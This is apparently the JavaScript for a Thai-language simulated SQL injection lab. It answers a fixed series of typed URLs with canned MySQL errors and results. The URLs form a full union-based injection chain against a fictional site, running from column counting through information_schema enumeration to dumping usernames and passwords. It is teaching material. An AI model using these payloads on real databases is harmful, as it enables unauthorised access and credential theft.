$(document).ready(function(){
    var input = $("#input");
    var content1 = $("#content1");
    var article = $("#article");
    var article_code = $("#article_code");
    var content2 = $("#content2");
    var sqlstatus = $("#sqlstatus");
    var sqltext = $("#sqltext");
    var sqlquery = $("#sqlquery");
    var password = $("#password");
    var passwordStatus = $("#passwordStatus");
    var win = $("#win");
    var checkButton = $("#checkButton");
    var textarticle = $("#textarticle");
    var answer1 = $("#answer1");
    var answer2 = $("#answer2");

    checkButton.click(function(){
      if(password.val() == "HAK709"){
          passwordStatus.removeClass("hide");
          win.removeClass("hide");
          answer1.addClass("hide");
          answer2.removeClass("hide");
          passwordStatus.text("รหัสถูกต้อง");
        return;
      }
      if(password.val()){
        passwordStatus.removeClass("hide");
        passwordStatus.text("รหัสไม่ถูกต้อง");
      }
    });
    

    var time = setInterval(function(){
      if(input.val().indexOf("https://hakka.hka/article?id=") < 0){
        input.val("https://hakka.hka/article?id=");
      }
    }, 100);
    input.keypress(function(e){
      if(e.which == 13){
        var texturl = input.val();
        passwordStatus.addClass("hide");
        win.addClass("hide");
        answer1.removeClass("hide");
        answer2.addClass("hide");
        content1.removeClass("hide");
        content2.addClass("hide");
        article.text('บทความ');
        article_code.text('x');
        textarticle.html(`<b>สวัสดีครับทุกท่าน !!</b> ยินดีตอนรับเข้าสู้เนื้อหาส่วนแรกของเว็บไซต์ใหม่ของเรานะครับ......`);
        sqlquery.text(`select * from article where id = `);
        if(texturl == "https://hakka.hka/article?id=1"){
          content1.removeClass("hide");
          content2.addClass("hide");
          article.text('บทความ');
          article_code.text('x');
          textarticle.html(`<b>สวัสดีครับทุกท่าน !!</b> ยินดีตอนรับเข้าสู้เนื้อหาส่วนแรกของเว็บไซต์ใหม่ของเรานะครับ......`);
          sqlquery.text(`select * from article where id = 1`);
        }
        if(texturl == "https://hakka.hka/article?id='"){
          content1.addClass("hide");
          content2.removeClass("hide");
          sqlstatus.text("SQLSTATE[42000]:");
          sqltext.text(`Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual 
          that corresponds to your MySQL server version for the right syntax to use near ''' at line 1`);
          sqlquery.text(`select * from article where id = ‘`);
        }

        if(texturl == "https://hakka.hka/article?id=1 UNION SELECT 1"){
          content1.addClass("hide");
          content2.removeClass("hide");
          sqlstatus.text("SQLSTATE[21000]:");
          sqltext.text(`Cardinality violation: 1222 The used SELECT statements have a different number of columns`);
          sqlquery.text(`select * from article where id = 1 UNION SELECT 1`);
        }

        if(texturl == "https://hakka.hka/article?id=1 UNION SELECT 1,2"){
          content1.addClass("hide");
          content2.removeClass("hide");
          sqlstatus.text("SQLSTATE[21000]:");
          sqltext.text(`Cardinality violation: 1222 The used SELECT statements have a different number of columns`);
          sqlquery.text(`select * from article where id = 1 UNION SELECT 1,2`);

        }
        
        if(texturl == "https://hakka.hka/article?id=1 UNION SELECT 1,2,3"){
          content1.removeClass("hide");
          content2.addClass("hide");
          article.text('บทความ');
          article_code.text('1');
          textarticle.html(`<b>สวัสดีครับทุกท่าน !!</b> ยินดีตอนรับเข้าสู้เนื้อหาส่วนแรกของเว็บไซต์ใหม่ของเรานะครับ......`);
          sqlquery.text(`select * from article where id = 0 UNION SELECT 1,2,3`);

        }
        if(texturl == "https://hakka.hka/article?id=0 UNION SELECT 1,2,3"){
          content1.removeClass("hide");
          content2.addClass("hide");
          article.text('บทความ');
          article_code.text('x');
          textarticle.html(`<b>สวัสดีครับทุกท่าน !!</b> ยินดีตอนรับเข้าสู้เนื้อหาส่วนแรกของเว็บไซต์ใหม่ของเรานะครับ......`);
          sqlquery.text(`select * from article where id = 0 UNION SELECT 1,2,3`);

        }
        if(texturl == "https://hakka.hka/article?id=0 UNION SELECT 1,2,database()"){
          content1.removeClass("hide");
          content2.addClass("hide");
          article.text('2');
          article_code.text('1');
          textarticle.html(`<b>sqli_one</b>`);
          sqlquery.text(`select * from article where id = 0 UNION SELECT 1,2,database()`);

        }
        if(texturl == "https://hakka.hka/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'"){
          content1.removeClass("hide");
          content2.addClass("hide");
          article.text('2');
          article_code.text('1');
          textarticle.html(`<b>article,straff,users</b>`);
          sqlquery.text(`select * from article where id = 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`);

        }
        if(texturl == "https://hakka.hka/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'"){
          content1.removeClass("hide");
          content2.addClass("hide");
          article.text('2');
          article_code.text('1');
          textarticle.html(`<b>id,username,password</b>`);
          sqlquery.text(`select * from article where id = 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`);


        }

        if(texturl == "https://hakka.hka/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users"){
          content1.removeClass("hide");
          article.text("2");
          article_code.text("1");
          textarticle.html(`<b>ADMIN</b> : PAS5W089<br><b>KAO</b> : PASKW03D<br><b>HAKKA</b> : HAK709`)
          sqlquery.text(`select * from article where id = 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`);
        }

      }
    });
});


function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }